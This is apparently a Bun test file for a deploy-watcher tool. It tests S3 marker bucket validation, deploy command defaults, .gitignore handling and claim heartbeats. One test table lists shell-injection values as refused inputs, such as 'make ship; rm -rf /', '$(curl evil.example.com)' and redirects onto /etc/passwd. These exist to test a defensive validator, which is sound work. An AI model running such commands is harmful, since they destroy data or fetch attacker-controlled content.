import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { DeployClaim } from "./deploy-claim";
import {
  defaultProdDeployCmd,
  defaultStageDeployCmd,
  ensureChongIgnored,
  formatDeployStepSuffix,
  liveTipCoversSha,
  loadRepoDeployConfig,
  prodDeployedShaBucket,
  selectLiveDeployTip,
  shortDeployStep,
  stageDeployedShaBucket,
  startClaimHeartbeat,
} from "./stage-deploy";

function repo(): string {
  return mkdtempSync(path.join(tmpdir(), "chong-repo-"));
}
function withChong(dir: string, cfg: unknown): void {
  mkdirSync(path.join(dir, ".chong"), { recursive: true });
  writeFileSync(path.join(dir, ".chong", "config.json"), JSON.stringify(cfg));
}
function asFrontend(dir: string): void {
  mkdirSync(path.join(dir, "scripts"), { recursive: true });
  writeFileSync(path.join(dir, "scripts", "deploy-frontend.sh"), "#!/bin/sh\n");
}

describe("stageDeployedShaBucket — the cross-repo hazard", () => {
  test("is null for a repo that configured no bucket", () => {
    // The bug this closes: the bucket was a module constant and the marker was written
    // unconditionally, so watching a second repo overwrote FRONTEND's deployed-git-sha.txt
    // with the other repo's SHA — and FRONTEND's stage CI reads that marker to decide
    // whether it can no-op, so it would skip a deploy it should have run.
    expect(stageDeployedShaBucket(repo())).toBeNull();
  });

  test("uses the repo's own bucket when configured", () => {
    const dir = repo();
    withChong(dir, { stageDeployedShaBucket: "some-other-bucket" });
    expect(stageDeployedShaBucket(dir)).toBe("some-other-bucket");
  });

  test("does NOT sniff a bucket from the presence of a deploy script", () => {
    // Removed 2026-09-10: this used to return a hardcoded LynxCraft bucket for any
    // repo containing scripts/deploy-frontend.sh. That shipped one project's
    // infrastructure name inside chong, and would write that project's marker on
    // behalf of an unrelated repo that merely had a similarly-named script. The
    // repo declares its own bucket now (FRONTEND does, in .chong/config.json).
    const dir = repo();
    asFrontend(dir);
    expect(stageDeployedShaBucket(dir)).toBeNull();
  });

  test("a configured bucket is used even for a repo with a deploy script", () => {
    const dir = repo();
    asFrontend(dir);
    withChong(dir, { stageDeployedShaBucket: "explicit" });
    expect(stageDeployedShaBucket(dir)).toBe("explicit");
  });
});

describe("prodDeployedShaBucket", () => {
  test("is null unless configured", () => {
    expect(prodDeployedShaBucket(repo())).toBeNull();
  });

  test("reads the configured production marker bucket", () => {
    const dir = repo();
    withChong(dir, { prodDeployedShaBucket: "prod-bucket" });
    expect(prodDeployedShaBucket(dir)).toBe("prod-bucket");
  });
});

describe("marker bucket name validation — repo-controlled config, format only", () => {
  // .chong/config.json is deliberately committed to the watched repo, so
  // stageDeployedShaBucket/prodDeployedShaBucket are repo-supplied text. There is no argv
  // injection here (the value lands in one s3://<bucket>/<key> argv element), but a bad
  // name can redirect marker WRITES (deployed SHA + operator user/host, to any bucket the
  // operator can write) or READS (liveTipCoversSha trusting a bucket that echoes back the
  // current tip, silently skipping a needed deploy). A refused name must read as exactly
  // "no bucket configured" — the same state as omitting the key.

  test("a valid bucket name passes", () => {
    const dir = repo();
    withChong(dir, {
      stageDeployedShaBucket: "my-app-ci-deploy-markers",
      prodDeployedShaBucket: "my-app-prod-deploy-markers",
    });
    expect(stageDeployedShaBucket(dir)).toBe("my-app-ci-deploy-markers");
    expect(prodDeployedShaBucket(dir)).toBe("my-app-prod-deploy-markers");
  });

  test("a bucket name with dots and digits passes", () => {
    const dir = repo();
    withChong(dir, { stageDeployedShaBucket: "app-ci.deploy-markers.42b" });
    expect(stageDeployedShaBucket(dir)).toBe("app-ci.deploy-markers.42b");
  });

  const invalidCases: Array<[string, string]> = [
    ["uppercase", "My-Bucket"],
    ["too short", "ab"],
    ["too long", `a${"b".repeat(62)}c`],
    ["leading dot", ".my-bucket"],
    ["trailing dot", "my-bucket."],
    ["leading hyphen", "-my-bucket"],
    ["trailing hyphen", "my-bucket-"],
    ["double dot", "my..bucket"],
    ["IP address", "192.168.1.1"],
    ["empty after trim", "   "],
  ];

  for (const [label, bad] of invalidCases) {
    test(`refuses a stage bucket that is ${label}`, () => {
      const dir = repo();
      withChong(dir, { stageDeployedShaBucket: bad });
      expect(stageDeployedShaBucket(dir)).toBeNull();
    });

    test(`refuses a prod bucket that is ${label}`, () => {
      const dir = repo();
      withChong(dir, { prodDeployedShaBucket: bad });
      expect(prodDeployedShaBucket(dir)).toBeNull();
    });
  }
});

describe("selectLiveDeployTip — prefer live S3 markers", () => {
  const s3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  const branch = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
  const file = "cccccccccccccccccccccccccccccccccccccccc";
  const tree = "dddddddddddddddddddddddddddddddddddddddd";

  test("S3 commit wins over a newer-looking local branch", () => {
    const live = selectLiveDeployTip({
      s3Commit: s3,
      s3Tree: tree,
      branchSha: branch,
      fileSha: file,
    });
    expect(live).toEqual({ commit: s3, tree, source: "s3" });
  });

  test("S3 tree alone is enough to prefer the marker (commit may be absent)", () => {
    const live = selectLiveDeployTip({
      s3Commit: null,
      s3Tree: tree,
      branchSha: branch,
      fileSha: file,
    });
    expect(live.source).toBe("s3");
    expect(live.tree).toBe(tree);
    expect(live.commit).toBeNull();
  });

  test("falls back to local branch when S3 is empty", () => {
    const live = selectLiveDeployTip({
      s3Commit: null,
      s3Tree: null,
      branchSha: branch,
      fileSha: file,
    });
    expect(live).toEqual({ commit: branch, tree: null, source: "local-branch" });
  });

  test("falls back to the .chong file when branch is missing too", () => {
    const live = selectLiveDeployTip({
      s3Commit: null,
      s3Tree: null,
      branchSha: null,
      fileSha: file,
    });
    expect(live).toEqual({ commit: file, tree: null, source: "local-file" });
  });

  test("normalises SHAs to lowercase", () => {
    const live = selectLiveDeployTip({
      s3Commit: s3.toUpperCase(),
      s3Tree: tree.toUpperCase(),
      branchSha: null,
      fileSha: null,
    });
    expect(live.commit).toBe(s3);
    expect(live.tree).toBe(tree);
  });
});

describe("liveTipCoversSha", () => {
  test("matches on commit or on tree", () => {
    const tip = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const tree = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    expect(liveTipCoversSha({ commit: tip, tree: null, source: "s3" }, tip, null)).toBe(true);
    expect(
      liveTipCoversSha(
        { commit: "cccccccccccccccccccccccccccccccccccccccc", tree, source: "s3" },
        tip,
        tree,
      ),
    ).toBe(true);
    expect(liveTipCoversSha({ commit: null, tree: null, source: "none" }, tip, tree)).toBe(false);
  });
});

describe("defaultStageDeployCmd", () => {
  test("prefers .chong/config.json over everything", () => {
    const dir = repo();
    asFrontend(dir);
    withChong(dir, { stageDeployCmd: "make ship" });
    expect(defaultStageDeployCmd(dir)).toBe("make ship");
  });

  test("falls back to the repo's own deploy:stage script", () => {
    const dir = repo();
    writeFileSync(
      path.join(dir, "package.json"),
      JSON.stringify({ scripts: { "deploy:stage": "serverless deploy --stage stage" } }),
    );
    expect(defaultStageDeployCmd(dir)).toBe("npm run deploy:stage");
  });

  test("is null when the repo says nothing about deploying", () => {
    // Must stay null rather than guessing: a wrong deploy command is worse than none.
    const dir = repo();
    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ scripts: { build: "tsc" } }));
    expect(defaultStageDeployCmd(dir)).toBeNull();
  });

  test("survives a malformed config and package.json rather than crashing the TUI", () => {
    const dir = repo();
    mkdirSync(path.join(dir, ".chong"), { recursive: true });
    writeFileSync(path.join(dir, ".chong", "config.json"), "{ not json");
    writeFileSync(path.join(dir, "package.json"), "{ also not json");
    expect(loadRepoDeployConfig(dir)).toEqual({});
    expect(defaultStageDeployCmd(dir)).toBeNull();
  });
});

describe("configured deploy command validation — shell metacharacter injection", () => {
  // .chong/config.json is deliberately committed to the watched repo, so its
  // stageDeployCmd/prodDeployCmd is repo-supplied text run via `bash -c` with the
  // operator's full environment (AWS credentials included). A clean configured command
  // must still work; one containing a forbidden shell metacharacter must be refused
  // entirely (falls back to "no deploy command configured"), not run neutered.

  test("a clean configured stageDeployCmd still works", () => {
    const dir = repo();
    withChong(dir, { stageDeployCmd: "make ship-stage --env=ci" });
    expect(defaultStageDeployCmd(dir)).toBe("make ship-stage --env=ci");
  });

  test("a clean configured prodDeployCmd still works", () => {
    const dir = repo();
    withChong(dir, { prodDeployCmd: "make ship-prod --env=production" });
    expect(defaultProdDeployCmd(dir)).toBe("make ship-prod --env=production");
  });

  test("the built-in deploy-frontend.sh default still passes validation unchanged", () => {
    const dir = repo();
    asFrontend(dir);
    expect(defaultStageDeployCmd(dir)).toBe(
      "CI=true FORCE=1 DEPLOY_SKIP_INSTALL=1 ./scripts/deploy-frontend.sh ci",
    );
    expect(defaultProdDeployCmd(dir)).toBe(
      "CI=true FORCE=1 DEPLOY_SKIP_INSTALL=1 ./scripts/deploy-frontend.sh prod",
    );
  });

  const metacharacterCases: Array<[string, string]> = [
    ["semicolon", "make ship; rm -rf /"],
    ["pipe", "make ship | tee /tmp/x"],
    ["background/AND", "make ship && curl evil.example.com"],
    ["ampersand alone", "make ship & disown"],
    ["dollar substitution", "make ship $(curl evil.example.com)"],
    ["backtick substitution", "make ship `curl evil.example.com`"],
    ["subshell paren", "(make ship)"],
    ["closing paren", "make ship) ; rm -rf /"],
    ["redirect out", "make ship > /etc/passwd"],
    ["redirect in", "make ship < /etc/passwd"],
    ["embedded newline", "make ship\ncurl evil.example.com"],
    ["embedded carriage return", "make ship\rcurl evil.example.com"],
  ];

  for (const [label, malicious] of metacharacterCases) {
    test(`refuses a configured stageDeployCmd containing a ${label}`, () => {
      const dir = repo();
      withChong(dir, { stageDeployCmd: malicious });
      expect(defaultStageDeployCmd(dir)).toBeNull();
    });

    test(`refuses a configured prodDeployCmd containing a ${label}`, () => {
      const dir = repo();
      withChong(dir, { prodDeployCmd: malicious });
      expect(defaultProdDeployCmd(dir)).toBeNull();
    });
  }

  test("an unsafe configured stageDeployCmd does not fall through to the built-in default", () => {
    // The refusal must land the repo in "cannot local-deploy", not silently swap in a
    // different (safe) command the operator did not ask for.
    const dir = repo();
    asFrontend(dir);
    withChong(dir, { stageDeployCmd: "make ship; rm -rf /" });
    expect(defaultStageDeployCmd(dir)).toBeNull();
  });

  test("an unsafe configured prodDeployCmd does not fall through to the built-in default", () => {
    const dir = repo();
    asFrontend(dir);
    withChong(dir, { prodDeployCmd: "make ship; rm -rf /" });
    expect(defaultProdDeployCmd(dir)).toBeNull();
  });
});

describe("ensureChongIgnored", () => {
  test("creates .chong and ignores it", () => {
    const dir = repo();
    ensureChongIgnored(dir);
    expect(existsSync(path.join(dir, ".chong"))).toBe(true);
    expect(readFileSync(path.join(dir, ".gitignore"), "utf8")).toContain(".chong/");
  });

  test("ignores machine-local state but NOT config.json", () => {
    // .chong holds two kinds of thing. state.json / stage-deployed-sha / wt/ are
    // machine-local; config.json is deliberate per-repo configuration, and a blanket
    // ignore would mean every fresh clone silently loses the deploy command and marker
    // bucket.
    const dir = repo();
    ensureChongIgnored(dir);
    const out = readFileSync(path.join(dir, ".gitignore"), "utf8");
    expect(out).toContain(".chong/");
    expect(out).toContain("!.chong/config.json");
    // The negation must come after the ignore, or git does not apply it.
    expect(out.indexOf("!.chong/config.json")).toBeGreaterThan(out.indexOf(".chong/"));
  });

  test("appends without clobbering an existing .gitignore", () => {
    const dir = repo();
    writeFileSync(path.join(dir, ".gitignore"), "node_modules\ndist\n");
    ensureChongIgnored(dir);
    const out = readFileSync(path.join(dir, ".gitignore"), "utf8");
    expect(out).toContain("node_modules");
    expect(out).toContain("dist");
    expect(out).toContain(".chong/");
  });

  test("is idempotent and does not re-append", () => {
    const dir = repo();
    ensureChongIgnored(dir);
    ensureChongIgnored(dir);
    ensureChongIgnored(dir);
    // Count the exact ignore LINE, not the substring: `!.chong/config.json` also
    // contains ".chong/", which made a substring count read 2 and look like a re-append.
    const lines = readFileSync(path.join(dir, ".gitignore"), "utf8")
      .split("\n")
      .map((l) => l.trim());
    // `.chong/*`, not `.chong/` — see ensureChongIgnored. The "already covered"
    // check must recognise the exact form it writes, or every run re-appends.
    expect(lines.filter((l) => l === ".chong/*")).toHaveLength(1);
    expect(lines.filter((l) => l === "!.chong/config.json")).toHaveLength(1);
  });

  test("respects an existing rule written any of the usual ways", () => {
    for (const rule of [".chong", ".chong/", "/.chong", "/.chong/"]) {
      const dir = repo();
      writeFileSync(path.join(dir, ".gitignore"), `${rule}\n`);
      ensureChongIgnored(dir);
      const out = readFileSync(path.join(dir, ".gitignore"), "utf8");
      expect(out.trim()).toBe(rule);
    }
  });

  test("adds a trailing newline before appending to a file that lacks one", () => {
    const dir = repo();
    writeFileSync(path.join(dir, ".gitignore"), "dist");
    ensureChongIgnored(dir);
    expect(readFileSync(path.join(dir, ".gitignore"), "utf8")).not.toContain("dist#");
  });
});

describe("startClaimHeartbeat — serializes overlapping ticks", () => {
  const claim: DeployClaim = { v: 1, id: "claim-1", user: "si", sha: "abc1234", at: "now" };

  function wait(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  test("never runs a second heartbeat while one is still in flight", async () => {
    let concurrent = 0;
    let maxConcurrent = 0;
    let calls = 0;
    const heartbeat = async () => {
      calls += 1;
      concurrent += 1;
      maxConcurrent = Math.max(maxConcurrent, concurrent);
      // Slower than the interval below, so without the in-flight guard the next tick
      // would fire while this one is still running.
      await wait(30);
      concurrent -= 1;
      return true;
    };

    const stop = startClaimHeartbeat(
      "bucket",
      claim,
      () => {
        throw new Error("should not be lost");
      },
      { heartbeat, intervalMs: 5 },
    );

    await wait(120);
    stop();
    // Let any in-flight tick from just before `stop()` finish before asserting.
    await wait(40);

    expect(maxConcurrent).toBe(1);
    expect(calls).toBeGreaterThan(1);
  });

  test("calls onLost exactly once when the claim is stolen, and stops heartbeating", async () => {
    let calls = 0;
    let lostCalls = 0;
    const heartbeat = async () => {
      calls += 1;
      return false;
    };

    const stop = startClaimHeartbeat(
      "bucket",
      claim,
      () => {
        lostCalls += 1;
      },
      { heartbeat, intervalMs: 5 },
    );

    await wait(60);
    const callsAtLoss = calls;
    await wait(60);
    stop();

    expect(lostCalls).toBe(1);
    // No further heartbeat calls once `lost` is set, even though the timer kept firing.
    expect(calls).toBe(callsAtLoss);
  });

  test("does nothing when there is no bucket or no claim (nothing to heartbeat)", () => {
    let called = false;
    const stop = startClaimHeartbeat(null, claim, () => {
      called = true;
    });
    expect(typeof stop).toBe("function");
    stop();
    expect(called).toBe(false);
  });

  test("a throwing heartbeat does not escape as an unhandled rejection", async () => {
    // Regression for: beat() reaching Bun.spawn(["aws", ...]) with `aws` missing from PATH
    // used to throw out of `tick`'s try/finally (no catch), and `void tick()` turned that
    // into an unhandled rejection that killed the whole `chong watch` process.
    let lostCalls = 0;
    const notes: string[] = [];
    const heartbeat = async (): Promise<boolean> => {
      throw new Error("spawn aws ENOENT");
    };

    const stop = startClaimHeartbeat(
      "bucket",
      claim,
      () => {
        lostCalls += 1;
      },
      { heartbeat, intervalMs: 5, onProgress: (msg) => notes.push(msg) },
    );

    // If the throw escaped as an unhandled rejection, bun:test would fail this test (or the
    // process would exit) well before this wait completes.
    await wait(60);
    stop();

    expect(notes.some((n) => n.includes("spawn aws ENOENT"))).toBe(true);
  });

  test("repeated heartbeat failures eventually count as the claim being lost", async () => {
    let lostCalls = 0;
    const heartbeat = async (): Promise<boolean> => {
      throw new Error("boom");
    };

    const stop = startClaimHeartbeat(
      "bucket",
      claim,
      () => {
        lostCalls += 1;
      },
      { heartbeat, intervalMs: 5 },
    );

    await wait(200);
    stop();

    // Not swallowed forever, and not triggered on the very first flaky tick either.
    expect(lostCalls).toBe(1);
  });

  test("a hung heartbeat times out instead of wedging every later tick", async () => {
    // Regression for the in-flight guard: with no timeout, a stalled `aws s3 cp` (no
    // AbortSignal / timeout passed to Bun.spawn) left `inFlight` stuck true forever, and
    // `if (lost || inFlight) return;` skipped every subsequent tick — the exact double-write
    // the claim exists to prevent.
    let calls = 0;
    let lostCalls = 0;
    const heartbeat = (): Promise<boolean> => {
      calls += 1;
      return new Promise(() => {
        /* never resolves */
      });
    };

    const stop = startClaimHeartbeat(
      "bucket",
      claim,
      () => {
        lostCalls += 1;
      },
      { heartbeat, intervalMs: 20, timeoutMs: 10 },
    );

    // Wait only long enough for the guard to have freed up and let a second attempt start
    // (well short of HEARTBEAT_FAILURE_LIMIT consecutive timeouts) — the point being proven
    // here is "the next tick isn't wedged", not "a permanently hung heartbeat never gives up".
    await wait(35);
    stop();

    expect(calls).toBeGreaterThan(1);
    expect(lostCalls).toBe(0);
  });
});

describe("shortDeployStep / formatDeployStepSuffix", () => {
  test("maps known progress messages to short labels", () => {
    expect(shortDeployStep("deploy claim: writing as alice@host…")).toBe("claiming");
    expect(shortDeployStep("deploy claim: waiting 8s for competing writers…")).toBe("claim wait");
    expect(shortDeployStep("deploy stage: resetting shadow to abc1234…")).toBe("reset shadow");
    expect(shortDeployStep("deploy stage: eslint gate…")).toBe("eslint");
    expect(shortDeployStep("deploy stage: unresolved-import scan…")).toBe("import scan");
    expect(shortDeployStep("deploy stage: running CI=true ./scripts/deploy-frontend.sh ci…")).toBe(
      "build+upload",
    );
    expect(shortDeployStep("deploy prod: running npm run deploy:prod…")).toBe("build+upload");
  });

  test("ignores heartbeat / follow-up noise so the active step stays put", () => {
    expect(shortDeployStep("deploy: heartbeat attempt failed (1/3) — timed out")).toBeNull();
    expect(shortDeployStep("deploy stage: claim release failed (boom)")).toBeNull();
    expect(shortDeployStep("deploy stage: Discord notify failed")).toBeNull();
    expect(
      shortDeployStep("deploy stage: live, but S3 marker failed (AccessDenied)"),
    ).toBeNull();
  });

  test("suffix includes spinner, step counter when known, and elapsed seconds", () => {
    const started = 1_000_000;
    expect(formatDeployStepSuffix("eslint", started, started + 12_500)).toBe(
      " [⠹ 4/6 eslint, 12s]",
    );
    expect(formatDeployStepSuffix("build+upload", started, started)).toBe(
      " [⠋ 6/6 build+upload, 0s]",
    );
    // Unknown label: no n/total, still shows spinner + seconds.
    expect(formatDeployStepSuffix("aborting", started, started + 3_000)).toBe(
      " [⠸ aborting, 3s]",
    );
  });
});
